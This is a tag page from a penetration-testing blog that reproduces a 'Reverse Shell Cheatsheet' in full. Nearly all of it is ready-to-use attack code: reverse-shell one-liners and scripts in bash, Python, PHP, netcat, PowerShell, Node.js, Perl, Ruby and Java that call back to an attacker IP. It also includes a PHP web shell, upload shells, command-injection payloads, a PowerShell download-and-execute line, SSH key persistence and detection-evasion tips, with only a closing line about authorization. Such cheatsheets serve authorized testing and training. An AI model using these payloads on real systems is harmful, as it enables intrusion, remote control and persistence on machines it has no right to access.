<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Reverse-Shells | realspaceeagle</title>
<meta name="keywords" content="">
<meta name="description" content="Expert cybersecurity insights, penetration testing tutorials, and hands-on security demonstrations. Learn ethical hacking, network security, and defensive techniques with real-world scenarios.">
<meta name="author" content="realspaceeagle">
<link rel="canonical" href="https://realspaceeagle.github.io/tags/reverse-shells/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.a482bf00fa5c046040ef7973ad5fdf5657890cacb596c93f1382f664ca542074.css" integrity="sha256-pIK/APpcBGBA73lzrV/fVleJDKy1lsk/E4L2ZMpUIHQ=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://realspaceeagle.github.io/favicon.svg">
<link rel="icon" type="image/png" sizes="16x16" href="https://realspaceeagle.github.io/favicon.svg">
<link rel="icon" type="image/png" sizes="32x32" href="https://realspaceeagle.github.io/favicon.svg">
<link rel="apple-touch-icon" href="https://realspaceeagle.github.io/favicon.svg">
<link rel="mask-icon" href="https://realspaceeagle.github.io/favicon.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" type="application/rss+xml" href="https://realspaceeagle.github.io/tags/reverse-shells/index.xml" title="rss">
<link rel="alternate" hreflang="en" href="https://realspaceeagle.github.io/tags/reverse-shells/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>

<meta name="description" content="">
<meta name="keywords" content="">
<meta name="author" content="realspaceeagle">
<meta name="robots" content="index, follow">
<meta name="viewport" content="width=device-width, initial-scale=1.0">


<link rel="canonical" href="https://realspaceeagle.github.io/tags/reverse-shells/">


<meta property="og:title" content="Reverse-Shells">
<meta property="og:description" content="">
<meta property="og:url" content="https://realspaceeagle.github.io/tags/reverse-shells/">
<meta property="og:site_name" content="realspaceeagle">
<meta property="og:locale" content="en_US"><meta property="og:type" content="website"><meta property="og:image" content="https://realspaceeagle.github.io/images/og-image.svg">
  <meta property="og:image:alt" content="realspaceeagle">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@haran_loga">
<meta name="twitter:creator" content="@haran_loga">
<meta name="twitter:title" content="Reverse-Shells">
<meta name="twitter:description" content=""><meta name="twitter:image" content="https://realspaceeagle.github.io/images/og-image.svg">
  <meta name="twitter:image:alt" content="realspaceeagle">
<script type="application/ld+json">
{
  "@context": "https://schema.org","@type": "WebPage",
  "name": "Reverse-Shells",
  "description": "",
  "url": "https:\/\/realspaceeagle.github.io\/tags\/reverse-shells\/",
  "publisher": {
    "@type": "Person",
    "name": "realspaceeagle",
    "jobTitle": "Cybersecurity Professional \u0026 Penetration Tester",
    "url": "https:\/\/realspaceeagle.github.io\/"
  }}
</script>

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position": 1,
      "name": "Home",
      "item": "https:\/\/realspaceeagle.github.io\/"
    }]
}
</script>


<link rel="stylesheet" href="/css/terminal-style.css">


<link rel="stylesheet" href="/css/scroll-enhancement.css">


<link rel="stylesheet" href="/css/mobile-navigation.css">


<link rel="stylesheet" href="/css/mobile-responsive-pages.css">


<link rel="stylesheet" href="/css/header-width-fix.css">


<link rel="stylesheet" href="/css/share-buttons.css">


<link rel="stylesheet" href="/css/comments.css">


<link rel="stylesheet" href="/css/blog-enhancements.css">


<link rel="stylesheet" href="/css/blog-sidebar.css">


<link rel="stylesheet" href="/css/project-toggle.css">


<link rel="stylesheet" href="/css/code-copy-enhancements.css">


<link rel="stylesheet" href="/css/ctf-writeup.css">


<link rel="stylesheet" href="/css/github-stats.css">


<link rel="stylesheet" href="https://unpkg.com/github-calendar@2.3.4/dist/github-calendar-responsive.css" onerror="this.remove();" />
<script src="https://unpkg.com/github-calendar@2.3.4/dist/github-calendar.min.js" onerror="this.remove();"></script>


<script src="/js/github-calendar-enhanced.js" defer></script>


<script src="/js/github-contribution-tracker.js" defer></script>


<script src="/js/github-api-fallback.js" defer></script>


<script src="/js/github-integration.js" defer></script>


<script src="/js/twitter-timeline.js" defer></script>
<script src="/js/twitter-manual.js" defer></script>


<script src="/js/code-copy-enhanced.js" defer></script>





      <script async src="https://www.googletagmanager.com/gtag/js?id=G-GPTRZ14YZS"></script>
      <script>
        var doNotTrack = false;
        if ( false ) {
          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
          var doNotTrack = (dnt == "1" || dnt == "yes");
        }
        if (!doNotTrack) {
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', 'G-GPTRZ14YZS');
        }
      </script><meta property="og:url" content="https://realspaceeagle.github.io/tags/reverse-shells/">
  <meta property="og:site_name" content="realspaceeagle">
  <meta property="og:title" content="Reverse-Shells">
  <meta property="og:description" content="Expert cybersecurity insights, penetration testing tutorials, and hands-on security demonstrations. Learn ethical hacking, network security, and defensive techniques with real-world scenarios.">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="website">
      <meta property="og:image" content="https://realspaceeagle.github.io/images/og-image.svg">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://realspaceeagle.github.io/images/og-image.svg">
<meta name="twitter:title" content="Reverse-Shells">
<meta name="twitter:description" content="Expert cybersecurity insights, penetration testing tutorials, and hands-on security demonstrations. Learn ethical hacking, network security, and defensive techniques with real-world scenarios.">

</head>

<body class="list" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }
</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://realspaceeagle.github.io/" accesskey="h" title="realspaceeagle (Alt + H)">realspaceeagle</a>
            
            
            <button class="mobile-menu-toggle" id="mobile-menu-toggle" aria-label="Toggle mobile menu">
                <span class="hamburger-line"></span>
                <span class="hamburger-line"></span>
                <span class="hamburger-line"></span>
            </button>
            
            <div class="logo-switches">
                
                <div class="social-icons">
                    <a href="https://www.linkedin.com/in/dream4ip/" target="_blank" rel="noopener noreferrer" 
                       title="Connect on LinkedIn" aria-label="LinkedIn Profile" class="social-link">
                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
                            <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/>
                        </svg>
                    </a>
                    <a href="https://twitter.com/haran_loga" target="_blank" rel="noopener noreferrer" 
                       title="Follow on X/Twitter" aria-label="Twitter Profile" class="social-link">
                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
                            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
                        </svg>
                    </a>
                    <a href="https://github.com/realspaceeagle" target="_blank" rel="noopener noreferrer" 
                       title="View Code on GitHub" aria-label="GitHub Profile" class="social-link">
                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
                            <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
                        </svg>
                    </a>
                </div>
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        
        <ul id="menu" class="desktop-menu">
            <li>
                <a href="https://realspaceeagle.github.io/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://realspaceeagle.github.io/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://realspaceeagle.github.io/archives/" title="Archives">
                    <span>Archives</span>
                </a>
            </li>
            <li>
                <a href="https://realspaceeagle.github.io/cheatsheets/" title="Cheatsheets">
                    <span>Cheatsheets</span>
                </a>
            </li>
            <li>
                <a href="https://realspaceeagle.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://realspaceeagle.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="https://realspaceeagle.github.io/categories/" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://realspaceeagle.github.io/projects/" title="Projects">
                    <span>Projects</span>
                </a>
            </li>
            <li>
                <a href="https://realspaceeagle.github.io/contact/" title="Contact">
                    <span>Contact</span>
                </a>
            </li>
        </ul>
        
        
        <div id="mobile-menu" class="mobile-menu">
            <ul class="mobile-menu-list">
                <li>
                    <a href="https://realspaceeagle.github.io/" title="Home">
                        <span>Home</span>
                    </a>
                </li>
                <li>
                    <a href="https://realspaceeagle.github.io/about/" title="About">
                        <span>About</span>
                    </a>
                </li>
                <li>
                    <a href="https://realspaceeagle.github.io/archives/" title="Archives">
                        <span>Archives</span>
                    </a>
                </li>
                <li>
                    <a href="https://realspaceeagle.github.io/cheatsheets/" title="Cheatsheets">
                        <span>Cheatsheets</span>
                    </a>
                </li>
                <li>
                    <a href="https://realspaceeagle.github.io/search/" title="Search" accesskey=/>
                        <span>Search</span>
                    </a>
                </li>
                <li>
                    <a href="https://realspaceeagle.github.io/tags/" title="Tags">
                        <span>Tags</span>
                    </a>
                </li>
                <li>
                    <a href="https://realspaceeagle.github.io/categories/" title="Categories">
                        <span>Categories</span>
                    </a>
                </li>
                <li>
                    <a href="https://realspaceeagle.github.io/projects/" title="Projects">
                        <span>Projects</span>
                    </a>
                </li>
                <li>
                    <a href="https://realspaceeagle.github.io/contact/" title="Contact">
                        <span>Contact</span>
                    </a>
                </li>
            </ul>
        </div>
    </nav>
</header>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const mobileMenuToggle = document.getElementById('mobile-menu-toggle');
    const mobileMenu = document.getElementById('mobile-menu');
    const body = document.body;
    
    if (mobileMenuToggle && mobileMenu) {
        mobileMenuToggle.addEventListener('click', function() {
            const isOpen = mobileMenu.classList.contains('active');
            
            if (isOpen) {
                mobileMenu.classList.remove('active');
                mobileMenuToggle.classList.remove('active');
                body.classList.remove('mobile-menu-open');
            } else {
                mobileMenu.classList.add('active');
                mobileMenuToggle.classList.add('active');
                body.classList.add('mobile-menu-open');
            }
        });
        
        
        const mobileMenuLinks = mobileMenu.querySelectorAll('a');
        mobileMenuLinks.forEach(link => {
            link.addEventListener('click', function() {
                mobileMenu.classList.remove('active');
                mobileMenuToggle.classList.remove('active');
                body.classList.remove('mobile-menu-open');
            });
        });
        
        
        document.addEventListener('click', function(event) {
            if (!mobileMenu.contains(event.target) && !mobileMenuToggle.contains(event.target)) {
                mobileMenu.classList.remove('active');
                mobileMenuToggle.classList.remove('active');
                body.classList.remove('mobile-menu-open');
            }
        });
    }
});
</script><main class="main"> 
<header class="page-header"><div class="breadcrumbs"><a href="https://realspaceeagle.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://realspaceeagle.github.io/tags/">Tags</a></div>
  <h1>
    Reverse-Shells
  </h1>
</header>

<article class="post-entry tag-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">Reverse Shell Cheatsheet
    </h2>
  </header>
  <div class="entry-content">
    <p>Reverse Shell Cheatsheet Setup Listener Netcat Listener # Basic netcat listener nc -nlvp 9001 # Enhanced with rlwrap for better shell experience rlwrap nc -nlvp 9001 # OpenBSD netcat nc -nlvp 9001 # Traditional netcat nc -l -p 9001 Socat Listener # Basic socat listener socat file:`tty`,raw,echo=0 tcp-listen:9001 # Encrypted socat listener socat openssl-listen:9001,cert=server.crt,key=server.key,verify=0 - Bash Reverse Shells Basic Bash # Standard bash reverse shell bash -i &gt;&amp; /dev/tcp/10.10.14.13/9001 0&gt;&amp;1 # Alternative syntax bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.13/9001 0&gt;&amp;1&#39; # URL encoded for web applications bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.13%2F9001%200%3E%261%27 # Base64 encoded echo YmFzaCAtaSA&#43;JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy85MDAxIDA&#43;JjE= | base64 -d | bash Bash Variations # Using exec exec 5&lt;&gt;/dev/tcp/10.10.14.13/9001;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # Using /bin/sh /bin/sh -i &gt;&amp; /dev/tcp/10.10.14.13/9001 0&gt;&amp;1 # With specific shell path /usr/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.13/9001 0&gt;&amp;1 Python Reverse Shells Python 2 &amp; 3 Compatible # Standard Python reverse shell python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.13&#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39; # Python with pty spawn python -c &#39;import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.13&#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;);&#39; # Python3 specific python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.13&#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39; Python PTY Shell # Interactive shell with PTY python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; # Local Python PTY spawn (after getting basic shell) /usr/local/bin/python3 -c &#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39; Advanced Python Shell # Multi-line Python reverse shell import socket, subprocess, os, threading, sys def s2p(s, p): while True: data = s.recv(1024) if len(data) &gt; 0: p.stdin.write(data) p.stdin.flush() def p2s(s, p): while True: s.send(p.stdout.read(1)) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&#34;10.10.14.13&#34;, 9001)) p = subprocess.Popen([&#34;/bin/sh&#34;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE) s2p_thread = threading.Thread(target=s2p, args=[s, p]) p2s_thread = threading.Thread(target=p2s, args=[s, p]) s2p_thread.daemon = True p2s_thread.daemon = True s2p_thread.start() p2s_thread.start() try: p.wait() except KeyboardInterrupt: s.close() PHP Reverse Shells Basic PHP # Simple PHP reverse shell php -r &#39;$sock=fsockopen(&#34;10.10.14.13&#34;,9001);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39; # PHP with error handling php -r &#39;$sock=fsockopen(&#34;10.10.14.13&#34;,9001);if($sock){$proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);}&#39; Web-based PHP Shell &lt;?php set_time_limit(0); $ip = &#39;10.10.14.13&#39;; $port = 9001; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = &#39;uname -a; w; id; /bin/sh -i&#39;; $daemon = 0; $debug = 0; if (function_exists(&#39;pcntl_fork&#39;)) { $pid = pcntl_fork(); if ($pid == -1) { printit(&#34;ERROR: Can&#39;t fork&#34;); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit(&#34;Error: Can&#39;t setsid()&#34;); exit(1); } $daemon = 1; } else { printit(&#34;WARNING: Failed to daemonise. This is quite common and not fatal.&#34;); } chdir(&#34;/&#34;); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(&#34;$errstr ($errno)&#34;); exit(1); } $descriptorspec = array( 0 =&gt; array(&#34;pipe&#34;, &#34;r&#34;), 1 =&gt; array(&#34;pipe&#34;, &#34;w&#34;), 2 =&gt; array(&#34;pipe&#34;, &#34;w&#34;) ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(&#34;ERROR: Can&#39;t spawn shell&#34;); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(&#34;Successfully opened reverse shell to $ip:$port&#34;); while (1) { if (feof($sock)) { printit(&#34;ERROR: Shell connection terminated&#34;); break; } if (feof($pipes[1])) { printit(&#34;ERROR: Shell process terminated&#34;); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(&#34;SOCK READ&#34;); $input = fread($sock, $chunk_size); if ($debug) printit(&#34;SOCK: $input&#34;); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(&#34;STDOUT READ&#34;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(&#34;STDOUT: $input&#34;); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(&#34;STDERR READ&#34;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(&#34;STDERR: $input&#34;); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print &#34;$string\n&#34;; } } ?&gt; PHP Command Execution # Simple PHP command execution &lt;?php system($_GET[&#39;cmd&#39;]); ?&gt; # More advanced web shell &lt;?php if(isset($_GET[&#39;cmd&#39;])) { echo &#34;&lt;pre&gt;&#34; . shell_exec($_GET[&#39;cmd&#39;]) . &#34;&lt;/pre&gt;&#34;; } ?&gt; # POST request shell # POST /shell.php # cmd=bash -c &#39;bash -i /dev/tcp/10.10.14.13/9001 0&gt;&amp;1&#39; Netcat Reverse Shells Traditional Netcat # Basic netcat reverse shell nc -e /bin/sh 10.10.14.13 9001 # Alternative if -e is not available rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.13 9001 &gt;/tmp/f # Using ncat (Nmap&#39;s netcat) ncat 10.10.14.13 9001 -e /bin/bash # OpenBSD netcat nc 10.10.14.13 9001 -e /bin/sh Advanced Netcat # Netcat with PTY nc -e /bin/bash 10.10.14.13 9001 # Netcat persistent shell while true; do nc -e /bin/bash 10.10.14.13 9001; sleep 60; done # UDP reverse shell nc -u 10.10.14.13 9001 -e /bin/bash PowerShell Reverse Shells (Windows) Basic PowerShell # Simple PowerShell reverse shell powershell -nop -c &#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;10.10.14.13&#39;,9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback &#43; &#39;PS &#39; &#43; (pwd).Path &#43; &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#34; # Base64 encoded PowerShell powershell -enc &lt;base64_encoded_command&gt; # Download and execute powershell &#34;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.13/shell.ps1&#39;)&#34; Advanced PowerShell # PowerShell with authentication bypass powershell -ExecutionPolicy Bypass -File shell.ps1 # PowerShell one-liner (formatted) $client = New-Object System.Net.Sockets.TCPClient(&#34;10.10.14.13&#34;,9001); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback &#43; &#34;PS &#34; &#43; (pwd).Path &#43; &#34;&gt; &#34;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close() Node.js Reverse Shells Basic Node.js # Simple Node.js reverse shell node -e &#34;require(&#39;child_process&#39;).exec(&#39;nc -e /bin/sh 10.10.14.13 9001&#39;)&#34; # Pure Node.js implementation (function(){ var net = require(&#34;net&#34;), cp = require(&#34;child_process&#34;), sh = cp.spawn(&#34;/bin/sh&#34;, []); var client = new net.Socket(); client.connect(9001, &#34;10.10.14.13&#34;, function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })(); Other Language Shells Perl # Perl reverse shell perl -e &#39;use Socket;$i=&#34;10.10.14.13&#34;;$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39; # Alternative Perl perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&#34;10.10.14.13:9001&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39; Ruby # Ruby reverse shell ruby -rsocket -e &#39;f=TCPSocket.open(&#34;10.10.14.13&#34;,9001).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39; # Alternative Ruby ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&#34;10.10.14.13&#34;,&#34;9001&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39; Java # Java reverse shell import java.io.*; import java.net.*; public class ReverseShell { public static void main(String[] args) throws Exception { Socket s = new Socket(&#34;10.10.14.13&#34;, 9001); Process p = Runtime.getRuntime().exec(&#34;/bin/bash&#34;); InputStream pi = p.getInputStream(); InputStream pe = p.getErrorStream(); InputStream si = s.getInputStream(); OutputStream po = p.getOutputStream(); OutputStream so = s.getOutputStream(); while(!s.isClosed()) { while(pi.available()&gt;0) so.write(pi.read()); while(pe.available()&gt;0) so.write(pe.read()); while(si.available()&gt;0) po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); try { p.exitValue(); break; } catch (Exception e) {} } p.destroy(); s.close(); } } Shell Stabilization TTY Upgrade # Python PTY python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; # Background the shell CTRL &#43; Z # Set raw mode and foreground stty raw -echo; fg # Set terminal environment export TERM=xterm # Check screen size and set stty -a stty rows 28 cols 110 Alternative TTY Methods # Using script script -qc /bin/bash /dev/null # Using socat (if available on target) socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.10.14.13:9001 # Using expect expect -c &#34;spawn /bin/bash; interact&#34; SSH-Based Access sshpass for Automated SSH Login # Install sshpass sudo apt install sshpass # SSH with password (from extracted credentials) sshpass -p &#39;PlayerOftheMatch2022&#39; ssh player@10.10.11.194 # SSH with password from file echo &#39;password123&#39; &gt; /tmp/pass sshpass -f /tmp/pass ssh user@target # SSH with password and command execution sshpass -p &#39;password&#39; ssh user@target &#39;whoami&#39; # Disable host key checking for testing sshpass -p &#39;password&#39; ssh -o StrictHostKeyChecking=no user@target SSH Key-Based Access # Use existing private key ssh -i /path/to/private_key user@target # SSH with specific key and no host checking ssh -i /path/to/key -o StrictHostKeyChecking=no user@target # Generate SSH key pair for persistence ssh-keygen -t rsa -f /tmp/key -N &#34;&#34; # Copy public key to target (if possible) cat /tmp/key.pub &gt;&gt; ~/.ssh/authorized_keys Shell Enhancement # Set environment variables export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin export SHELL=/bin/bash export HOME=/tmp # Enable command history export HISTFILE=/tmp/.bash_history # Color prompt export PS1=&#39;\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#39; Web Application Payloads Command Injection in Web Forms # Basic command injection ; bash -i &gt;&amp; /dev/tcp/10.10.14.13/9001 0&gt;&amp;1 # URL encoded %3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.13%2F9001%200%3E%261 # In JSON {&#34;cmd&#34;: &#34;; bash -i &gt;&amp; /dev/tcp/10.10.14.13/9001 0&gt;&amp;1&#34;} # As POST parameter cmd=bash -c &#39;bash -i /dev/tcp/10.10.14.13/9001 0&gt;&amp;1&#39; File Upload Shells # Simple PHP upload shell &lt;?php system($_GET[&#39;cmd&#39;]); ?&gt; # Save as shell.php and upload, then access: # http://target.com/uploads/shell.php?cmd=nc -e /bin/bash 10.10.14.13 9001 Troubleshooting Common Issues # No netcat with -e flag rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.13 9001 &gt;/tmp/f # Firewall blocking outbound connections # Try different ports: 80, 443, 53, 25 nc 10.10.14.13 443 -e /bin/bash # Limited shell environment export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin # No interactive shell python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; Testing Connectivity # Test if target can reach your IP ping 10.10.14.13 # Test specific port telnet 10.10.14.13 9001 nc -nv 10.10.14.13 9001 # DNS exfiltration test nslookup test.yourdomain.com Security Considerations Operational Security Use encrypted channels when possible (HTTPS, SSH tunnels) Avoid leaving artifacts on target systems Clean up uploaded files and temporary files Use staging servers to avoid direct connections Detection Evasion Use common ports (80, 443, 53) to blend with normal traffic Implement delays between connection attempts Use domain names instead of IP addresses when possible Rotate source IP addresses if available Always ensure you have proper authorization before deploying reverse shells on any target system. These techniques should only be used for legitimate security testing purposes.
</p>
  </div>
  <footer class="entry-footer"><span title='2024-01-01 00:00:00 +0000 UTC'>January 1, 2024</span>&nbsp;·&nbsp;<span>7 min</span>&nbsp;·&nbsp;<span>realspaceeagle</span></footer>
  <a class="entry-link" aria-label="post link to Reverse Shell Cheatsheet" href="https://realspaceeagle.github.io/cheatsheets/reverse-shells/"></a>
</article>
    </main>
